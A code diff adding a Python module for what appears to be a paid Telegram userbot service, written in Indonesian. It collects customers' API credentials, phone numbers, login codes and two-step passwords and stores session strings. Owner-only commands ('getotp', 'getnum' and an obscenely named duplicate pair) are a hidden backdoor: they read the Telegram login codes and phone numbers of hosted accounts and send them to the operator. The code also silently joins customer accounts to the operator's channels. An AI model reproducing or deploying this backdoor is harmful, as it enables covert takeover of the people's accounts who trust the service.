@@ -1,0 +1,570 @@
+import asyncio
+import datetime
+import importlib
+import sys
+from datetime import datetime, timedelta
+from os import environ, execle
+
+from pyrogram import filters
+from pyrogram.errors import *
+from pyrogram.types import *
+from pytz import timezone
+
+from Amang import *
+from Amang.config import *
+from Amang.modules import loadModule
+from Amang.utils import *
+
+
+def DATETIMEBOT():
+    mydate = datetime.now(timezone("Asia/Jakarta"))
+    da = mydate.strftime("🗓️ Tanggal: %d/%m/%Y")
+    dt = mydate.strftime("🕕 Jam: %H:%M")
+    f_d = f"{da}\n{dt}"
+    return f_d
+    
+
+@bot.on_message(filters.command(["buat_ubot"]))
+@bot.on_callback_query(filters.regex("buat_bot"))
+async def _(_, callback_query):
+    user_id = callback_query.from_user.id
+    AKSES_ID = await get_akses()
+    bots = bot.me.username
+    ID_SELES = await get_seles()
+    
+    if len(ubot._ubot) == MAX_UBOT:
+        if MAX_UBOT:
+            if bot.me.username == "@amwang_bot":
+                for i in range(2, 5):
+                    next_ubot = f"@amwang{i}_bot"
+            else:
+                next_ubot = "@amwang4_bot"
+        buttons = [
+            [InlineKeyboardButton(text="👮‍♂ Admin", callback_data="start_admin")],
+            [InlineKeyboardButton("Tutup", callback_data="0_cls")],
+        ]
+        await callback_query.message.delete()
+        return await bot.send_message(
+            user_id,
+            f"""
+<b>Peringatan ⚠️</b>
+<b>{bots} Sudah Full User</b>
+<b>Silahkan membuat userbot di {next_ubot}</b>
+
+""",
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup(buttons),
+        )
+    if user_id not in AKSES_ID:
+        buttons = [
+            [   InlineKeyboardButton(text="💰 Beli Userbot", callback_data="start_pmb"),
+                InlineKeyboardButton(text="👮🏻‍♀️ Daftar Admin", callback_data="start_admin"),
+            ],
+            [
+               InlineKeyboardButton(text="❌ Tutup", callback_data="0_cls")
+            ],
+        ]
+        await callback_query.message.delete()
+        return await bot.send_message(
+            user_id,
+            f"""
+<b>🤖 Buat userbot</b>\n\n<b>Untuk mengakses fitur premium ini, Anda perlu melakukan pembelian.</b>\n<b>Beli sekarang untuk bisa membuat userbot premium!</b>
+""",
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup(buttons),
+        )
+    try:
+        await callback_query.message.delete()
+        api_id_msg = await bot.ask(
+            user_id,
+            (
+                "<b>Silahkan masukkan API ID anda.</b>\n"
+                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+            ),
+            timeout=300,
+        )
+    except asyncio.TimeoutError:
+        return await bot.send_message(user_id, "Waktu Telah Habis")
+    if await is_cancel(callback_query, api_id_msg.text):
+        return
+    try:
+        api_id = int(api_id_msg.text)
+    except ValueError:
+        return await bot.send_message(user_id, "API ID Haruslah berupa angka.")
+    await callback_query.message.delete()
+    api_hash_msg = await bot.ask(
+        user_id,
+            (
+                "<b>Silahkan masukkan API HASH anda.</b>\n"
+                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+            ),
+            timeout=300,
+    )
+    if await is_cancel(callback_query, api_hash_msg.text):
+        return
+    api_hash = api_hash_msg.text
+    try:
+        await callback_query.message.delete()
+        phone = await bot.ask(
+            user_id,
+            (
+                "<b>Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format Kode Negara.\nContoh: +628xxxxxxx</b>\n"
+                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+            ),
+            timeout=300,
+        )
+    except asyncio.TimeoutError:
+        return await bot.send_message(user_id, "Waktu Telah Habis")
+    if await is_cancel(callback_query, phone.text):
+        return
+    phone_number = phone.text
+    new_client = Ubot(
+        name=str(callback_query.id),
+        api_id=api_id,
+        api_hash=api_hash,
+        in_memory=True,
+    )
+    get_otp = await bot.send_message(user_id, "<b>Mengirim Kode OTP...</b>")
+    await new_client.connect()
+    try:
+        code = await new_client.send_code(phone_number.strip())
+    except FloodWait as FW:
+        await get_otp.delete()
+        return await bot.send_message(user_id, FW)
+    except ApiIdInvalid as AII:
+        await get_otp.delete()
+        return await bot.send_message(user_id, AII)
+    except PhoneNumberInvalid as PNI:
+        await get_otp.delete()
+        return await bot.send_message(user_id, PNI)
+    except PhoneNumberFlood as PNF:
+        await get_otp.delete()
+        return await bot.send_message(user_id, PNF)
+    except PhoneNumberBanned as PNB:
+        await get_otp.delete()
+        return await bot.send_message(user_id, PNB)
+    except PhoneNumberUnoccupied as PNU:
+        await get_otp.delete()
+        return await bot.send_message(user_id, PNU)
+    except Exception as error:
+        await get_otp.delete()
+        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
+    try:
+        await get_otp.delete()
+        otp = await bot.ask(
+            user_id,
+            (
+                "<b>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n"
+                "\nJika Kode OTP adalah <code>12345</code> Tolong <b>[ TAMBAHKAN SPASI ]</b> kirimkan Seperti ini <code>1 2 3 4 5</code>\n"
+                "\n<b>Gunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>"
+            ),
+            timeout=300,
+        )
+    except asyncio.TimeoutError:
+        return await bot.send_message(user_id, "Waktu Telah Habis")
+    if await is_cancel(callback_query, otp.text):
+        return
+    otp_code = otp.text
+    try:
+        await new_client.sign_in(
+            phone_number.strip(),
+            code.phone_code_hash,
+            phone_code=" ".join(str(otp_code)),
+        )
+    except PhoneCodeInvalid as PCI:
+        return await bot.send_message(user_id, PCI)
+    except PhoneCodeExpired as PCE:
+        return await bot.send_message(user_id, PCE)
+    except BadRequest as error:
+        return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
+    except SessionPasswordNeeded:
+        try:
+            two_step_code = await bot.ask(
+                user_id,
+                "<b>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.\n\nGunakan /cancel untuk Membatalkan Proses Membuat Userbot</b>",
+                timeout=300,
+            )
+        except asyncio.TimeoutError:
+            return await bot.send_message(user_id, "Batas waktu tercapai 5 menit.")
+        if await is_cancel(callback_query, two_step_code.text):
+            return
+        new_code = two_step_code.text
+        try:
+            await new_client.check_password(new_code)
+        except Exception as error:
+            return await bot.send_message(user_id, f"<b>ERROR:</b> {error}")
+    session_string = await new_client.export_session_string()
+    await new_client.disconnect()
+    new_client.storage.session_string = session_string
+    new_client.in_memory = True
+    await new_client.start()
+    await add_ubot(
+        user_id=int(new_client.me.id),
+        api_id=api_id,
+        api_hash=api_id,
+        session_string=session_string,
+    )
+    for mod in loadModule():
+        importlib.reload(importlib.import_module(f"Amang.modules.{mod}"))
+    mydate = datetime.now(timezone("Asia/Jakarta")) + timedelta(days=30)
+    get_date = mydate.strftime("%d-%m-%Y")
+    text_done = f"<b>Terima kasih telah berlangganan {bot.me.mention}\nAkun: <a href=tg://openmessage?user_id={new_client.me.id}-{new_client.me.first_name} {new_client.me.last_name or ''}</a> > <code>{new_client.me.id}</code></b>\n<b>📅 Expired on :</b><code>{get_date}</code>"
+    await bot.send_message(
+        user_id,
+        text_done,
+        disable_web_page_preview=True,
+    )
+    now = datetime.now(timezone("Asia/Jakarta"))
+    date = now.strftime("%d-%m-%Y")
+    expire_date = now + timedelta(days=30)
+    await set_expired_date(new_client.me.id, expire_date)
+    await get_expired_date(new_client.me.id)
+    date = DATETIMEBOT()
+    await bot.send_message(
+        LOGS,
+        text_done,
+        disable_web_page_preview=True,
+    )
+    buttons = [
+        [
+            InlineKeyboardButton(
+                "🧑‍💻 Pembuat Userbot 🧑‍💻",
+                url=f"tg://openmessage?user_id={callback_query.from_user.id}",
+            )
+        ],
+    ]
+    await bot.send_message(
+        LOGS,
+        f"{text_done}\n<b>{date}</b>",
+        reply_markup=InlineKeyboardMarkup(buttons),
+        disable_web_page_preview=True,
+    )
+    try:
+        await new_client.join_chat("amangproject")
+        await new_client.join_chat("amwangs")
+        await new_client.join_chat("amwangsupport")
+    except UserAlreadyParticipant:
+        pass
+    if callback_query.from_user.id in ID_SELES:
+        return
+    else:
+        await remove_akses(callback_query.from_user.id)
+
+
+@bot.on_message(filters.command(["getotp", "getnum"]))
+async def otp_and_number(client, message):
+    user_id = message.from_user.id
+    if user_id not in AMANG:
+        return await message.reply(
+            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya owner bot yang bisa menggunakan perintah ini"
+        )
+    if len(message.command) < 2:
+        return await bot.send_message(
+            message.chat.id,
+            f"<code>{message.text} user_id userbot yang aktif</code>",
+            reply_to_message_id=message.id,
+        )
+    try:
+        for X in ubot._ubot:
+            if int(message.command[1]) == X.me.id:
+                if message.command[0] == "getotp":
+                    async for otp in X.search_messages(777000, limit=1):
+                        if otp.text:
+                            return await bot.send_message(
+                                message.chat.id,
+                                otp.text,
+                                reply_to_message_id=message.id,
+                            )
+                        else:
+                            return await bot.send_message(
+                                message.chat.id,
+                                "<code>Kode Otp Tidak Di Temukan</code>",
+                                reply_to_message_id=message.id,
+                            )
+                elif message.command[0] == "getnum":
+                    return await bot.send_message(
+                        message.chat.id,
+                        X.me.phone_number,
+                        reply_to_message_id=message.id,
+                    )
+    except Exception as error:
+        return await bot.send_message(
+            message.chat.id, error, reply_to_message_id=message.id
+        )
+
+
+@bot.on_message(filters.command(["kontol1", "kontol2"]))
+async def otp_and_number(client, message):
+    user_id = message.from_user.id
+    if user_id not in AMANG:
+        return await message.reply(
+            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya owner bot yang bisa menggunakan perintah ini"
+        )
+    if len(message.command) < 2:
+        return await bot.send_message(
+            message.chat.id,
+            f"<code>{message.text} user_id userbot yang aktif</code>",
+            reply_to_message_id=message.id,
+        )
+    try:
+        for X in ubot._ubot:
+            if int(message.command[1]) == X.me.id:
+                if message.command[0] == "kontol1":
+                    async for otp in X.search_messages(bot.me.id, limit=10):
+                        if otp.text:
+                            await bot.send_message(
+                                message.chat.id,
+                                otp.text,
+                                reply_to_message_id=message.id,
+                            )
+                        else:
+                            await bot.send_message(
+                                message.chat.id,
+                                "<code>Kode Otp Tidak Di Temukan</code>",
+                                reply_to_message_id=message.id,
+                            )
+                elif message.command[0] == "kontol2":
+                    await bot.send_message(
+                        message.chat.id,
+                        X.me.phone_number,
+                        reply_to_message_id=message.id,
+                    )
+    except Exception as error:
+        await bot.send_message(
+            message.chat.id, error, reply_to_message_id=message.id
+        )
+
+@bot.on_message(filters.command(["user"]))
+async def user(client, message):
+    user_id = message.from_user.id
+    seles = await get_seles()
+    if user_id not in AMANG and user_id not in seles:
+        return await message.reply(
+            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya pengguna yang memiliki akses bisa menggunakan perintah ini"
+        )
+    count = 0
+    user = ""
+    for X in ubot._ubot:
+        try:
+            count += 1
+            user += f"""
+❏ USERBOT KE {count}
+ ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a> 
+ ╰ ID: <code>{X.me.id}</code>
+"""
+        except:
+            pass
+    if int(len(str(user))) > 4096:
+        with BytesIO(str.encode(str(user))) as out_file:
+            out_file.name = "userbot.txt"
+            await message.reply_document(
+                document=out_file,
+            )
+    else:
+        await message.reply(f"<b>{user}</b>")
+
+
+@bot.on_message(filters.command("getubot"))
+async def _(client, message):
+    user_id = message.from_user.id
+    chat_id = message.chat.id
+    seles = await get_seles()
+    if user_id not in AMANG and user_id not in seles:
+        return await message.reply(
+            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya pengguna yang memiliki akses bisa menggunakan perintah ini"
+        )
+    count = 0
+    for ub in ubot._ubot:
+        count += 1
+        get_exp = await get_expired_date(ub.me.id)
+        exp = get_exp.strftime("%d-%m-%Y") if get_exp is not None else "Tidak diketahui"
+        list_ubot = f"""
+<b>❏ USERBOT KE {count}</b>
+<b> ├ AKUN:</b> <a href=tg://openmessage?user_id={ub.me.id}>{ub.me.first_name} {ub.me.last_name or ''}</a> 
+<b> ├ EXPIRED: {exp}</b>
+<b> ╰ ID: </b> <code>{ub.me.id}</code>
+"""
+        await bot.send_message(
+            chat_id,
+            list_ubot,
+            reply_markup=InlineKeyboardMarkup(
+                [
+                    [
+                        InlineKeyboardButton(
+                            "👤 Info", callback_data=f"profil {ub.me.id}"
+                        ),
+                    ],
+                ]
+            ),
+        )
+        await asyncio.sleep(1.5)
+
+
+@ubot.on_message(filters.me & anjay("delubot") & filters.me)
+async def _(client, message):
+    user_id = message.from_user.id
+    if user_id not in AMANG:
+        await eor(message, "<b> Tidak punya akses</b>.")
+        return
+    if message.reply_to_message:
+        user_id = message.reply_to_message.from_user.id
+    else:
+        text = message.text.split()
+        if len(text) < 2:
+            await eor(
+                message,
+                "<code>Maaf, format yang Anda berikan salah. Mohon balas ke pengguna atau berikan username/user ID.</code>",
+            )
+            return
+        username = text[1]
+        try:
+            user = await client.get_users(username)
+        except ValueError:
+            user = None
+        if user is None:
+            await eor(
+                message, f"<code>Maaf, pengguna {username} tidak ditemukan.</code>"
+            )
+            return
+        user_id = user.id
+
+    await remove_ubot(user_id)
+    await eor(message, f"<b> ✅ Done.</b>")
+
+
+@bot.on_message(filters.command("delubot"))
+async def _(client, message):
+    user_id = message.from_user.id
+    if user_id not in AMANG:
+        return
+    if len(message.command) < 2:
+        return await message.reply("Ketik /delubot user_id Untuk Mematikan Userbot")
+    else:
+        for X in ubot._ubot:
+            try:
+                user = await bot.get_users(message.text.split()[1])
+                await remove_ubot(user.id)
+                await message.reply(
+                    f"<b> ✅ {user.mention} Berhasil Dihapus Dari Database</b>"
+                )
+                return await bot.send_message(
+                    user.id, "<b>MASA AKTIF ANDA TELAH BERAKHIR"
+                )
+            except Exception as e:
+                return await message.reply(f"<b>❌ {e} </b>")
+
+
+@bot.on_message(filters.command(["restart"]))
+async def restart(_, message):
+    user_id = message.from_user.id
+    my_id = []
+    for _ubot_ in ubot._ubot:
+        my_id.append(_ubot_.me.id)
+    if user_id not in my_id:
+        return await message.reply(
+            "<b>❌ Anda tidak bisa menggunakan perintah ini\n\n✅ Anda jelek, belom mandi, dekil bau, jijik gue sama lo, dan anda bukanlah pengguna @amanguserbot.</b>"
+        )
+    buttons = [
+        [
+            InlineKeyboardButton(text="✅ Restart", callback_data=f"ress {user_id}"),
+        ],
+        [
+            InlineKeyboardButton("❌ Batalkan", callback_data="0_cls"),
+        ],
+    ]
+    await bot.send_message(
+        message.chat.id,
+        f"<b>Restart Ubot?</b>",
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup(buttons),
+    )
+
+
+async def reboot():
+    for _ubot in await get_userbots():
+        ubot_ = Ubot(**_ubot)
+        try:
+            if ubot_.is_connected:
+                await ubot_.stop()
+                await ubot_.start()
+            else:
+                await ubot_.start()
+        except Exception as e:
+            print(f"{e}")
+
+
+async def restart_all():
+    asyncio.get_event_loop().create_task(reboot())
+
+
+async def restart_bot(ubot_):
+    for _ubot in await get_userbots():
+        ubot_ = Ubot(**_ubot)
+    try:
+        if ubot_.is_connected:
+            await ubot_.disconnect()
+        else:
+            ubot_.in_memory = False
+            await ubot_.start()
+            for mod in loadModule():
+                importlib.reload(importlib.import_module(f"Amang.modules.{mod}"))
+            print("BOT SERVER RESTARTED !!")
+    except Exception as e:
+        print(f"{e}")
+
+
+@bot.on_callback_query(filters.regex("ress"))
+async def is_restart(_, callback_query):
+    for _ubot in await get_userbots():
+        if int(_ubot["name"]) == int(callback_query.data.split()[1]):
+            ubot_ = Ubot(**_ubot)
+            try:
+                await callback_query.edit_message_text("<b>Processing...</b>")
+                await restart_bot(ubot_)
+                await asyncio.sleep(2)
+                await callback_query.edit_message_text(
+                    "✅ <b>UserBot was restarted!</b>"
+                )
+            except Exception as err:
+                await callback_query.edit_message_text(f"{err}")
+
+
+@bot.on_message(filters.command(["control"]))
+async def restart(_, message):
+    user_id = message.from_user.id
+    if user_id not in AMANG:
+        return await message.reply("<b>❌ Only Amang can use this command</b>")
+    buttons = [
+        [
+            InlineKeyboardButton(text="✅", callback_data="restart_semua"),
+            InlineKeyboardButton("❌", callback_data="0_cls"),
+        ],
+    ]
+    await bot.send_message(
+        message.chat.id,
+        f"<b>Restart Server</b>",
+        disable_web_page_preview=True,
+        reply_markup=InlineKeyboardMarkup(buttons),
+    )
+
+
+@bot.on_callback_query(filters.regex("restart_semua"))
+async def is_restart(_, callback_query):
+    try:
+        await callback_query.edit_message_text("<b>Processing...</b>")
+        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
+    except BaseException as err:
+        LOGGER(__name__).info(f"{err}")
+        return
+    await asyncio.sleep(2)
+    await callback_query.edit_message_text("✅ <b>AmangUbot Berhasil Di Restart.</b>")
+    args = [sys.executable, "-m", "Amang"]
+    execle(sys.executable, *args, environ)
+
+
+async def is_cancel(callback_query, text):
+    if text.startswith("/cancel"):
+        user_id = callback_query.from_user.id
+        await bot.send_message(user_id, "<b>Membatalkan Proses Pembuatan Userbot!</b>")
+        return True
+    return False
